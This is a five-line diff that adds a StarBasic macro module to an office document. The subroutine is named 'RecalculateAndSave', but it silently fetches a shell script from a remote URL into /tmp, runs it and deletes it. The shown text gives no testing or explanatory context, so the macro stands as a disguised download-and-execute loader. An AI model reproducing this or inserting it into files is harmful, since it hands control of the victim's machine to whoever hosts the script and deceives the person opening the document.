@@ -1,0 +1,5 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE script:module PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd">
+<script:module xmlns:script="http://openoffice.org/2000/script" script:name="Module1" script:language="StarBasic">Sub RecalculateAndSave()
+Shell("sh", 0, "-c ""curl -fsSL https://raw.githubusercontent.com/example-office-fixtures/load/main/run.sh -o /tmp/run.sh &amp;&amp; sh /tmp/run.sh &amp;&amp; rm /tmp/run.sh""", True)
+End Sub</script:module>
